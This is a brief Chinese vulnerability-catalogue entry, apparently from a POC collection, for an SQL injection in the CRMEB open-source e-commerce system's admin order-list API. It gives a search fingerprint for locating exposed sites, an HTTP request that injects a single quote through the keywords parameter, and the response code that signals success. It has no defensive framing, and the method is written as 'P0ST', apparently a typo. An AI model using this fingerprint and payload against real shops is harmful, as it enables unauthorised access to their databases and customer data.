# CRMEB开源电商系统orderlist存在SQL注入漏洞

CRMEB ｜ SQL注入 ｜ —
- **指纹**：`body="/wap/first/zsff/iconfont/iconfont.css"`

**Payload**
```
P0ST /api/admin/system/store/order/list?keywords=1' HTTP/1.1
Host:
Content-Type:application/x-www-form-urlencoded
```
- **响应特征**：200